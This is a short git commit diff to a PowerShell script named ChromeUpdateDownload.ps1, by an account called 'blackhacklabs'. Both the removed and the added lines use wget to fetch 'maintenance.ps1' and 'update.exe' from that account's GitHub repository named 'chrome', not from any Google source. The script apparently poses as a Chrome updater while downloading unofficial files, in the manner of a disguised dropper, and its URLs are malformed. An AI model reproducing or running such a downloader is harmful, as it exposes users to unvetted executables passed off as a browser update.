347c9f840b97744ee47ae6036bd86edbf8c698ac
blackhacklabs <88569148+blackhacklabs@users.noreply.github.com>
2021-08-06 20:51:46 -0700

    Update ChromeUpdateDownload.ps1

--- ChromeUpdateDownload.ps1
+++ ChromeUpdateDownload.ps1
@@ -1,2 +1,2 @@
-wget 'https://github.com/blackhacklabs/chrome.git/maintenance.ps1' -OutFile maintenance.ps1
-wget 'https://github.com/blackhacklabs/chrome.git/update.exe' -OutFile update.exe
+wget 'https://github.com/blackhacklabs/chrome/maintenance.ps1.git' -OutFile maintenance.ps1
+wget 'https://github.com/blackhacklabs/chrome.git/update.exe.git' -OutFile update.exe
